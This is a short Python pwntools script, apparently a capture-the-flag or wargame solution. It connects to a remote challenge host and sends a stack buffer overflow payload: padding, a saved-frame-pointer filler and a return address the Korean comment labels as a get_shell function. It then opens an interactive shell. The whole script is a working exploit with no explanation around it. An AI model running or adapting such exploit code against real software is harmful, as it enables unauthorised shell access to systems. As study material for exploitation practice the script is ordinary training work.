from pwn import *
p = remote('fsi.zzado.kr',9931)
data = p.recvuntil(b"Input your payload :")
print(data)
payload = b'A'*32
payload += b'B'*4 #SFP
payload +=p32(0x080491C6)

#get_shell() 주소 : get_shell	080491C6	
print(payload)
p.sendline(payload)
p.interactive();
